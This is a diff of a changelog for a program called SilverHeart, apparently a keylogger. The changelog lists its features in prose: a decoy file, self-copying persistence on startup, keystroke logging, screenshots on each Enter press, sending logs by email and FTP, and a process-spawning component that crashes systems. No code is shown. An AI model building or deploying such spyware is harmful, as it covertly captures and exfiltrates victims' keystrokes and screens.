@@ -1,6 +1,19 @@
 # Changelog
 All notable changes to this project will be documented in this file.
 
+# v1.1.1 - 2019/04/14
+
+### Added
+
+- Directory where the program is allocated changed.
+
+### Fixed
+
+- Multidisk search optimization.
+- File allocation optimization.
+
+<sub><sup><i>Minor code cleanup.</i></sup></sub>
+
 # v1.1.0 - 2019/04/14
 
 ### Added
@@ -9,7 +22,6 @@ All notable changes to this project will be documented in this file.
 - Screenshot function.
   - Screenshot is taked every time "enter" is pressed.
 - Option to send logs via FTP.
-- Performance enhancement.
   
 ### Fixed
 
@@ -26,6 +38,8 @@ All notable changes to this project will be documented in this file.
   
  - `executer.py`:
    - Spawns hundreds of processes after being compiled until no memory is left leading to system crash.
+   
+- Performance enhancement.
 
 ### Removed
 
@@ -42,14 +56,21 @@ All notable changes to this project will be documented in this file.
   
 ### Fixed
 
-- Problem when moving *SilverHeart* for the safe directory when `replicator.py` was active.
-  - Now creates a new directory then copies *SilverHeart* to the new directory.
+- Problem when moving SilverHeart for the safe directory when `replicator.py` was active.
+  - Now creates a new directory then copies SilverHeart to the new directory.
 
 
 # v1.0.0 - 2019/04/05
 
 ### Added
 
-- Standard version of the program released for Windows with tests.
-- Standard version of the program released for macOS and Linux without tests.
+- Standard* version of the program released for Windows with tests.
+- Standard* version of the program released for macOS and Linux without tests.
   - Incomplete version for Linux and macOS, problem with auto launch option.
+  
+  
+___  
+<sub><sup>Standard version:  
+Program that when opened will create a decoy file and copy himself to a secure location.
+Runs on startup.
+Logs keystrokes and sends the log file via email when the OS is shuting down.</sup></sub>
